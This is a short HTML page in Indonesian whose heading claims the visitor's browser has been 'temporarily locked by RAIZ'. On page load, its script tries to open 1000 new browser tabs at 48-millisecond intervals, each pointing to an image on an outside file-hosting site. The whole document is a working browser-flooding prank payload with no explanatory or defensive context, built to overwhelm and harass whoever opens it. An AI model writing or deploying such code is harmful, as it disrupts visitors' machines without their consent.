<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>Auto Open Tab</title>
</head>
<body>

<h2>BROWSER DI KUNCI SEMENTARA OLEH RAIZ!!</h2>

<script>
window.onload = function() {
    let jumlahTab = 1000;

    for (let i = 0; i < jumlahTab; i++) {
        setTimeout(() => {
            window.open("https://files.catbox.moe/h52lha.png", "_blank");
        }, i * 48);
    }
};
</script>

</body>
</html>
